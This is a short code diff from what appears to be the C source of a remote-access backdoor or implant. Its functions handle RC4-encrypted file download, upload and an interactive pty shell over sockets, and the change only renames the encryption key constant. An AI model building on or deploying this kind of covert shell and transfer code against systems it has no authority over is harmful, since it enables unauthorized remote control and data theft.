@@ -121,7 +121,7 @@ void launcher_download(int sockr, int sockw, char *file, unsigned long size) {
     unsigned char buf[BUFSIZE];
     char *ptr;
 
-    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_crypt);
+    rc4_init((unsigned char *)RC4KEY, sizeof(RC4KEY), &rc4_crypt);
 
     ptr = strrchr(file, '/');
     if (ptr) { ptr++;}
@@ -178,7 +178,7 @@ void launcher_upload(int sockr, int sockw, char *file, unsigned long size) {
     struct timeval tv;
     int nfd = 0;
 
-    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_decrypt);
+    rc4_init((unsigned char *)RC4KEY, sizeof(RC4KEY), &rc4_decrypt);
 
 	// Timeout
 	tv.tv_sec=15;
@@ -233,8 +233,8 @@ void launcher_shell(int sockr, int sockw) {
     extern char *ptsname();
 	unsigned char echar = (unsigned char)ECHAR;
 
-    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_crypt);
-    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_decrypt);
+    rc4_init((unsigned char *)RC4KEY, sizeof(RC4KEY), &rc4_crypt);
+    rc4_init((unsigned char *)RC4KEY, sizeof(RC4KEY), &rc4_decrypt);
 
     pty = open("/dev/ptmx", O_RDWR);
     grantpt(pty);
